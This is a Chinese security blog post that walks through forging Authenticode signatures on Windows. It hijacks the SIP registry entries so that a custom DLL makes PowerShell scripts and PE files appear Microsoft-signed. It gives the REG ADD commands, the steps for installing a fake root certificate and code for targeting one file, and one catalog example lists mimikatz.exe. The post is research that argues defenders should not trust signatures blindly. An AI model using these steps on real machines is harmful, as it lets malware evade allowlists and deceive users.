@@ -1,0 +1,333 @@
+I"�C<h2 id="0x00-前言">0x00 前言</h2>
+<hr />
+
+<p>在上篇文章<a href="https://3gstudent.github.io/Authenticode%E7%AD%BE%E5%90%8D%E4%BC%AA%E9%80%A0-PE%E6%96%87%E4%BB%B6%E7%9A%84%E7%AD%BE%E5%90%8D%E4%BC%AA%E9%80%A0%E4%B8%8E%E7%AD%BE%E5%90%8D%E9%AA%8C%E8%AF%81%E5%8A%AB%E6%8C%81">《Authenticode签名伪造——PE文件的签名伪造与签名验证劫持》</a>介绍了针对单一文件的Authenticode签名伪造，需要在文件尾部添加伪造的签名数据，这次将介绍另一种签名伪造方式：通过修改系统的签名获取机制，欺骗系统将正常文件识别为包含签名数据。</p>
+
+<p><strong>注：</strong></p>
+
+<p>本文介绍的技巧参考自Matt Graeber@mattifestation公开的资料，本文将结合自己的经验，整理相关内容，添加个人理解。</p>
+
+<p><strong>参考资料：</strong></p>
+
+<p>https://specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf</p>
+
+<p>http://www.exploit-monday.com/2017/08/application-of-authenticode-signatures.html</p>
+
+<p>https://drive.google.com/file/d/0B-K55rLoulAfNms1aW1rbXF1Tmc/view</p>
+
+<h2 id="0x01-简介">0x01 简介</h2>
+<hr />
+
+<p>本文将要介绍以下内容：</p>
+
+<ul>
+  <li>针对powershell脚本的签名伪造方法</li>
+  <li>针对PE文件的签名伪造方法</li>
+  <li>针对其他类型文件的签名伪造方法</li>
+  <li>添加代码实现对特定文件的签名伪造</li>
+</ul>
+
+<h2 id="0x02-针对powershell脚本的签名伪造方法">0x02 针对powershell脚本的签名伪造方法</h2>
+<hr />
+
+<p>前提是powershell脚本需要包含一个签名(自己生成的签名会被识别为无效)，下面介绍如何将该无效签名伪造成有效的微软签名</p>
+
+<p>生成测试证书：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>makecert -n "CN=Microsoft Windows Test1" -r -eku 1.3.6.1.5.5.7.3.3 -sv certtest.pvk certtest.cer
+cert2spc certtest.cer certtest.spc
+pvk2pfx -pvk certtest.pvk -pi 123456 -spc certtest.spc -pfx certtest.pfx -f
+</code></pre></div></div>
+
+<p>不需要注册该证书</p>
+
+<p><strong>注：</strong></p>
+
+<p>使用makecert.exe要加参数： <code class="language-plaintext highlighter-rouge">-eku 1.3.6.1.5.5.7.3.3</code></p>
+
+<p>否则提示证书无法用于代码签名，具体错误如下：</p>
+
+<p><code class="language-plaintext highlighter-rouge">Set-AuthenticodeSignature : Cannot sign code. The specified certificate is not
+suitable for code signing.</code></p>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-11/2-1.png" alt="Alt text" /></p>
+
+<p>给powershell脚本签名：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$cert = Get-PfxCertificate certtest.pfx
+Set-AuthenticodeSignature -Filepath 1.ps1 -Cert $cert
+</code></pre></div></div>
+
+<p>验证证书：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-AuthenticodeSignature .\1.ps1
+</code></pre></div></div>
+
+<p>提示<code class="language-plaintext highlighter-rouge">UnknownError</code>，表示文件签名无效</p>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-11/2-2.png" alt="Alt text" /></p>
+
+<p>修改注册表，命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{603BCC1F-4B59-4E08-B724-D2C6297EF351}" /v "Dll" /t REG_SZ /d "C:\test\MySIP.dll" /f
+REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{603BCC1F-4B59-4E08-B724-D2C6297EF351}" /v "FuncName" /t REG_SZ /d "AutoApproveHash" /f
+
+REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{603BCC1F-4B59-4E08-B724-D2C6297EF351}" /v "Dll" /t REG_SZ /d "C:\test\MySIP.dll" /f
+REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{603BCC1F-4B59-4E08-B724-D2C6297EF351}" /v "FuncName" /t REG_SZ /d "GetLegitMSSignature" /f
+</code></pre></div></div>
+
+<p>再次验证：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-AuthenticodeSignature .\1.ps1
+</code></pre></div></div>
+
+<p>显示<code class="language-plaintext highlighter-rouge">Valid</code>，签名有效</p>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-11/2-3.png" alt="Alt text" /></p>
+
+<p><strong>注：</strong></p>
+
+<p>不同系统下相同名称的文件签名不同</p>
+
+<p><code class="language-plaintext highlighter-rouge">AFDD80C4EBF2F61D3943F18BB566D6AA6F6E5033</code>为Matt Graeber测试系统中的notepad.exe签名hash</p>
+
+<p>现在在我们自己的系统进行测试：<code class="language-plaintext highlighter-rouge">Win10 x64</code></p>
+
+<p>分别获取notepad.exe的签名信息：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-AuthenticodeSignature c:\windows\system32\notepad.exe
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sigcheck -i C:\Windows\System32\notepad.exe
+</code></pre></div></div>
+
+<p>可以发现sigcheck的输出内容中，<code class="language-plaintext highlighter-rouge">Thumbprint</code>对应文件签名hash，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-11/3-1.png" alt="Alt text" /></p>
+
+<p>接下来，将测试系统改为<code class="language-plaintext highlighter-rouge">Win7 x86</code></p>
+
+<p>在Win7下使用<code class="language-plaintext highlighter-rouge">Get-AuthenticodeSignature</code>无法获得notepad.exe的签名信息(catalog签名)</p>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-11/3-2.png" alt="Alt text" /></p>
+
+<p>但可以通过sigcheck获得，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-11/3-3.png" alt="Alt text" /></p>
+
+<p>hash为：<code class="language-plaintext highlighter-rouge">018B222E21FBB2952304D04D1D87F736ED46DEA4</code></p>
+
+<p>定位cat文件路径：<code class="language-plaintext highlighter-rouge">C:\Windows\system32\CatRoot\{F750E6C3-38EE-11D1-85E5-00C04FC295EE}\ntexe.cat</code></p>
+
+<p>.cat文件保存格式为ASN.1标准，直接通过记事本无法查看，需要解密，在线网址如下：</p>
+
+<p>https://lapo.it/asn1js/</p>
+
+<p>选择cat文件后即可解密显示完整格式</p>
+
+<p>格式解析可参考：</p>
+
+<p>https://support.microsoft.com/en-us/help/287547/object-ids-associated-with-microsoft-cryptography</p>
+
+<p>将该文件替换PoCSubjectInterfacePackage工程中的<code class="language-plaintext highlighter-rouge">MS_cert.bin</code>，重新编译</p>
+
+<p>配置注册表</p>
+
+<p>打开一个新的cmd，查看powershell脚本签名：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-AuthenticodeSignature .\1.ps1
+</code></pre></div></div>
+
+<p>同sighcheck获取的hash值保持一致，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-11/3-4.png" alt="Alt text" /></p>
+
+<p>powershell脚本的Authenticode签名伪造成功</p>
+
+<p>对以上操作直观的理解：</p>
+
+<p><strong>该方法是通过修改系统证书验证过程，使文件将指定的catalog签名作为自己的Authenticode签名</strong></p>
+
+<p>当然，所有带签名的powershell脚本均会统一成hash为<code class="language-plaintext highlighter-rouge">018B222E21FBB2952304D04D1D87F736ED46DEA4</code>的签名，这就带来了一个问题：<strong>这样会影响正常系统文件的签名校验</strong></p>
+
+<p>我们可以看到，通过这种方式伪造的签名会作用于所有powershell脚本，那么，我们能否针对特定powershell脚本作伪造呢？</p>
+
+<p>以Matt Graeber开源的工程PoCSubjectInterfacePackage作为模板进行修改，下载地址如下：</p>
+
+<p>https://github.com/mattifestation/PoCSubjectInterfacePackage</p>
+
+<p>重点关注函数<code class="language-plaintext highlighter-rouge">GetLegitMSSignature</code>，在线地址：</p>
+
+<p>https://github.com/mattifestation/PoCSubjectInterfacePackage/blob/master/MySIP/MySIP.c#L138</p>
+
+<p>查看结构<code class="language-plaintext highlighter-rouge">SIP_SUBJECTINFO *pSubjectInfo</code>的参数说明，地址如下：</p>
+
+<p>https://msdn.microsoft.com/en-us/library/windows/desktop/bb736434(v=vs.85).aspx</p>
+
+<p><code class="language-plaintext highlighter-rouge">pwsFileName</code>和<code class="language-plaintext highlighter-rouge">pwsDisplayName</code>均能够表示文件名称，所以可通过<code class="language-plaintext highlighter-rouge">MessageBox</code>进行验证</p>
+
+<p>函数<code class="language-plaintext highlighter-rouge">GetLegitMSSignature</code>内添加如下代码：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MessageBox (NULL, pSubjectInfo-&gt;pwsFileName, pSubjectInfo-&gt;pwsDisplayName,0);  
+</code></pre></div></div>
+
+<p>进行测试，成功获得传入文件名，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-11/4-1.png" alt="Alt text" /></p>
+
+<p>接下来的思路：</p>
+
+<p>对传入的文件名称进行判断，满足条件的文件加载对应的catalog签名，最终实现对特定文件的签名伪造</p>
+
+<p>筛选文件的代码如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if(lstrcmpi((LPCTSTR)pSubjectInfo-&gt;pwsFileName,L"C:\\test\\cer\\1.ps1")==0)
+{
+	MessageBox (NULL,L"Get selected file", (LPCTSTR)pSubjectInfo-&gt;pwsFileName,0) ;   
+}
+</code></pre></div></div>
+
+<p>完整代码可参考：</p>
+
+<p>https://raw.githubusercontent.com/3gstudent/test/master/MySIP.c</p>
+
+<p>当前文件为<code class="language-plaintext highlighter-rouge">C:\test\cer\1.ps1</code>时，符合条件，进行签名伪造，否则放弃</p>
+
+<p>测试如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-11/4-2.png" alt="Alt text" /></p>
+
+<p>成功实现对特定文件的签名伪造，这种方式的优点是不需要在文件尾部添加Authenticode签名，不改变文件hash</p>
+
+<p>当然，这仅仅是一个POC，还要对系统文件的签名验证做判断</p>
+
+<h2 id="0x03-针对pe文件的签名伪造方法">0x03 针对PE文件的签名伪造方法</h2>
+<hr />
+
+<p>参考这个列表：</p>
+
+<ul>
+  <li>C689AAB8-8E78-11D0-8C47-00C04FC295EE - PE</li>
+  <li>DE351A43-8E59-11D0-8C47-00C04FC295EE - catalog	.cat文件</li>
+  <li>9BA61D3F-E73A-11D0-8CD2-00C04FC295EE - CTL .ctl文件</li>
+  <li>C689AABA-8E78-11D0-8C47-00C04FC295EE - cabinet .cab文件</li>
+</ul>
+
+<p>如果替换exe文件的校验，即<code class="language-plaintext highlighter-rouge">CryptSIPDllVerifyIndirectData</code>和<code class="language-plaintext highlighter-rouge">CryptSIPDllGetSignedDataMsg</code>，命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" /v "Dll" /t REG_SZ /d "C:\test\MySIP.dll" /f
+REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" /v "FuncName" /t REG_SZ /d "AutoApproveHash" /f
+
+REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" /v "Dll" /t REG_SZ /d "C:\test\MySIP.dll" /f
+REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" /v "FuncName" /t REG_SZ /d "GetLegitMSSignature" /f
+</code></pre></div></div>
+
+<p>重启explorer.exe，所有的exe文件都包含hash为：<code class="language-plaintext highlighter-rouge">018B222E21FBB2952304D04D1D87F736ED46DEA4</code>的签名</p>
+
+<p>特别的地方：<strong>伪造的签名来自于cat文件，但是会以Authenticode签名的格式显示，通过文件属性能够看到签名信息(这是Authenticode签名的特性，catalog签名不具有该特性)</strong></p>
+
+<p>同样，修改原工程能够实现针对特定PE文件的签名伪造，方法不再赘述</p>
+
+<h2 id="0x04-针对cat文件的签名伪造方法">0x04 针对cat文件的签名伪造方法</h2>
+<hr />
+
+<p>如果对所有.cat文件的签名验证过程进行替换，再将其添加到安全编录数据库中，那么，包含catalog签名的PE文件是否也随即获得伪造签名呢？</p>
+
+<p>下面开始测试：</p>
+
+<p>新建文本文档cat.txt，内容如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[CatalogHeader]
+Name=makecat1.cat
+[CatalogFiles]
+&lt;hash&gt;ExeFile1=mimikatz.exe
+
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p>txt文件尾部需要一个空行，否则，在接下来的操作会报错，提示文件无法找到</p>
+
+<p>使用makecat.exe生成makecat1.cat：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>makecat -v cat.txt
+</code></pre></div></div>
+
+<p>为makecat1.cat添加伪造的Authenticode签名：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>signtool sign /f certtest.pfx /p 123456 makecat1.cat
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p>certtest.pfx不能使用之前手动生成的证书，不能加参数： <code class="language-plaintext highlighter-rouge">-eku 1.3.6.1.5.5.7.3.3</code>，否则exe文件的catalog签名将会校验失败</p>
+
+<p>生成certtest.pfx的操作如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>makecert -n "CN=Microsoft Windows Test1" -r -sv certtest.pvk certtest.cer
+cert2spc certtest.cer certtest.spc
+pvk2pfx -pvk certtest.pvk -pi 123456 -spc certtest.spc -pfx certtest.pfx -f
+</code></pre></div></div>
+
+<p>此处还需要将证书安装到“受信任的根证书颁发机构”存储区</p>
+
+<p>管理员权限：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certmgr.exe -add -c certtest.cer -s -r localmachine root
+</code></pre></div></div>
+
+<p>否则，之后的签名验证会报错，提示证书链不可信</p>
+
+<p><strong>补充：</strong></p>
+
+<p>从“受信任的根证书颁发机构”存储区删除证书的操作为：</p>
+
+<p>(管理员权限)</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certmgr.exe -del -c -n "Windows Test1" -s -r localMachine Root
+</code></pre></div></div>
+
+<p>cat文件对应GUID:<code class="language-plaintext highlighter-rouge">DE351A43-8E59-11D0-8C47-00C04FC295EE</code></p>
+
+<p>替换注册表键值：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{DE351A43-8E59-11D0-8C47-00C04FC295EE}" /v "Dll" /t REG_SZ /d "C:\test\MySIP.dll" /f
+REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{DE351A43-8E59-11D0-8C47-00C04FC295EE}" /v "FuncName" /t REG_SZ /d "AutoApproveHash" /f
+
+REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{DE351A43-8E59-11D0-8C47-00C04FC295EE}" /v "Dll" /t REG_SZ /d "C:\test\MySIP.dll" /f
+REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{DE351A43-8E59-11D0-8C47-00C04FC295EE}" /v "FuncName" /t REG_SZ /d "GetLegitMSSignature" /f
+</code></pre></div></div>
+
+<p>重启explorer.exe，所有的cat文件签名均为<code class="language-plaintext highlighter-rouge">Microsoft Windows</code></p>
+
+<p>将makecat1.cat添加到系统的安全编录数据库：</p>
+
+<p>(管理员权限)</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>signtool catdb -v makecat1.cat
+</code></pre></div></div>
+
+<p>最终，发现文件的catalog签名保持不变，无法进行伪造</p>
+
+<p>得出结论： <strong>这种方式无法对catalog签名进行伪造</strong></p>
+
+<h2 id="0x05-小结">0x05 小结</h2>
+<hr />
+
+<p>本文介绍了Authenticode签名伪造的另一种利用方法：通过修改系统的签名获取机制，欺骗系统将正常文件识别为包含签名数据。</p>
+
+<p>经过这两篇文章的测试，得出最终结论：应谨慎对待系统的Authenticode签名，因为通过修改注册表或dll劫持等方式均能够伪造出微软签名，对此，白名单等防御机制不应盲目相信Authenticode签名过的文件。</p>
+
+<hr />
+
+<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>
+
+:ET
